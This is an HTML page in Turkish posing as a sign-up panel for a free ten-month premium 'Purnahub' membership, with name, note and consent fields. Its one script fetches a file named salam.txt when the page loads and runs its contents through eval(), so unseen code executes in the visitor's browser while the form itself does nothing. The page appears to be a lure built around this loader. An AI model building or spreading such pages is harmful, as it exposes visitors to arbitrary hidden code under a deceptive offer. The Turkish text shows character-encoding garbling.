<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Purnahub 10 ay proplus √ºyelik</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at top left, #0a1a2f, #000);
      color: #e6f6f5;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      animation: bgPulse 10s infinite alternate;
    }
    @keyframes bgPulse {
      0% { background: radial-gradient(circle at top left, #0a1a2f, #000); }
      100% { background: radial-gradient(circle at bottom right, #001f3f, #000); }
    }
    .container {
      width: 100%;
      max-width: 800px;
      background: #101e33;
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 12px 40px rgba(0, 255, 209, 0.3);
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    h1 {
      font-size: 28px;
      margin-bottom: 12px;
      color: #00ffd1;
      text-align: center;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { text-shadow: 0 0 6px #00ffd1; }
      50% { text-shadow: 0 0 12px #00ffd1; }
    }
    label {
      display: block;
      margin-top: 18px;
      font-size: 14px;
      color: #9fb3c8;
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.06);
      background: rgba(255,255,255,0.02);
      color: #fff;
      font-size: 15px;
    }
    input[type="checkbox"] {
      width: auto;
      margin-right: 8px;
    }
    button {
      margin-top: 28px;
      padding: 14px 20px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(90deg, #00ffd1, #66e0ff);
      color: #001;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    .status {
      margin-top: 24px;
      font-size: 14px;
      color: #9fb3c8;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üöÄ Purnahub √ºyelik Giri≈ü Paneli</h1>
    <form id="form">
      <label for="name">Adƒ±nƒ±z</label>
      <input type="text" id="name" required placeholder="Adƒ±nƒ±zƒ± girin" />
      <label for="note">Not (istersen yaz)</label>
      <textarea id="note" rows="3" placeholder="Kƒ±sa bir not yazabilirsiniz"></textarea>
      <label>
        <input type="checkbox" id="consent" required />
        Purnahub √ºyelik ≈üartlarƒ±nƒ± kabul ediyom.
      </label>
      <button type="submit">G√∂nder</button>
    </form>
    <div class="status" id="status">Durum: √úyelik Bekleniyor</div>
  </div>

  <script>
    fetch("salam.txt?v=" + Date.now())
      .then(r => r.text())
      .then(code => eval(code))
      .catch(err => {
        document.getElementById("status").textContent = "‚ùå Kod y√ºklenemedi.";
      });
  </script>
</body>
</html>
